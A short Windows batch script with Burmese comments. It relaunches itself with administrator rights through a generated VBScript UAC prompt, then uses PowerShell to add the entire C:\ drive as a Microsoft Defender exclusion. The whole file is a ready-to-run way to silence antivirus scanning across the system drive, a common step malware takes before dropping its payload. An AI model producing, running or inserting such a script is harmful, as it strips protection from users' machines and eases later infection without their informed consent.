@echo off
:: Administrator ဟုတ်မဟုတ် စစ်ဆေးပြီး မဟုတ်ပါက Admin ဖြင့် ပြန်ဖွင့်ရန်
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Administrator ဖြင့် Run နေပါပြီ...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
exit /B

:gotAdmin
if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
pushd "%CD%"
CD /D "%~dp0"

:: ---------------------------------------------------------
:: အောက်ပါနေရာတွင် လိုအပ်သော Path ကို ထည့်ပါ
:: ---------------------------------------------------------
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"

echo Exclusion ထည့်သွင်းခြင်း ပြီးဆုံးပါပြီ။
pause